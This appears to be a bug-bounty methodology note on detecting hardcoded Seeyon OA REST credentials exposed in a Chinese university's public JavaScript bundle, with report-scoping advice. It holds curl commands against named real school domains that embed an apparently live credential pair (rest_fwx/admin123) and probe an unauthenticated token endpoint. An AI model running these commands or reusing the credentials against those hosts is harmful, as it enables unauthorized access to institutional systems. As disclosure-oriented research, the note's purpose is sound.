# GXTcmu Seeyon REST Token hardcoded credential case (2026-05-26)

## Class-level lesson

When an education target exposes `taskcenter-v4/static/js/app.js` or similar SPA bundles, grep for Seeyon token URLs:

```bash
curl -sk "https://TARGET/taskcenter-v4/static/js/app.js?V=null" | grep -aoE 'https?://[^"'"'"'<> )]+/seeyon/rest/token/[^"'"'"' <]+'
```

A reportable candidate exists when all of the following are true:

1. The URL is in a public JS bundle under the tested school domain.
2. The token endpoint contains a fixed REST account/password path such as `/seeyon/rest/token/<restUser>/<restPass>?loginName=`.
3. Unauthenticated empty `loginName` returns HTTP 200 JSON or a UUID/token-like identifier.
4. A random nonexistent `loginName` returns `User not found` or another user-lookup-specific error.
5. Replacing the REST password with a wrong value returns 401/auth failure, proving the exposed password is live.
6. OA root (`/seeyon/index.jsp` or `/seeyon/main.do`) confirms Seeyon/OA identity and version.

## Low-impact verification pattern

Do not use real teacher/student usernames unless explicitly authorized. Use only:

```bash
# 1. Extract hardcoded URL from public JS
curl -sk "https://service.gxtcmu.edu.cn/taskcenter-v4/static/js/app.js?V=null" | grep -aoE 'https?://[^"'"'"'<> )]+/seeyon/rest/token/[^"'"'"' <]+'

# 2. Empty loginName: token/signing logic reachable without login
curl -sk -D- "https://my.gzucm.edu.cn/seeyon/rest/token/rest_fwx/admin123?loginName="

# 3. Nonexistent user: user lookup path is reached
curl -sk -D- "https://my.gzucm.edu.cn/seeyon/rest/token/rest_fwx/admin123?loginName=__hermes_nonexistent_177979__"

# 4. Wrong REST password control: exposed credential is live
curl -sk -D- "https://my.gzucm.edu.cn/seeyon/rest/token/rest_fwx/__wrong_password__?loginName="

# 5. OA version/system identity
curl -sk "https://my.gzucm.edu.cn/seeyon/index.jsp" | grep -aoE '<title>[^<]+|V=V8_[0-9_]+_[0-9_]+' | head -10
```

## Report boundary

Default severity: medium / medium-high boundary.

Submit as hardcoded integration credential disclosure + unauthenticated token signing logic when the above controls pass. Do not overclaim full account takeover unless a legally authorized test account proves the token can read OA data or perform business actions.

If the OA domain differs from the target domain, state clearly that the leak source is the tested school’s public JS and ask the SRC to confirm linked OA/third-party asset ownership. This prevents rejection for asset-scope ambiguity while preserving the concrete root cause.

## Evidence to keep

Candidate directory should contain:

- `js_context.txt` — JS snippet containing the hardcoded token URL.
- `empty.headers` and `empty.body` — unauthenticated empty `loginName` response.
- `nonexistent.body` — random nonexistent user control.
- `controls/invalid_credential.headers` — wrong REST password returns 401.
- `controls/oa_root.body` — OA title/version evidence.
- `curls.txt` — all single-line reproduction commands.

## Pitfalls

- Do not treat the OA version alone as a vulnerability.
- Do not call real users’ `loginName` without explicit authorization.
- Do not hide the asset relationship problem; explain cross-domain linkage if present.
- If empty `loginName` only returns the REST integration account ID, describe it as token/session identifier or token-signing logic evidence, not confirmed access to personal OA data.
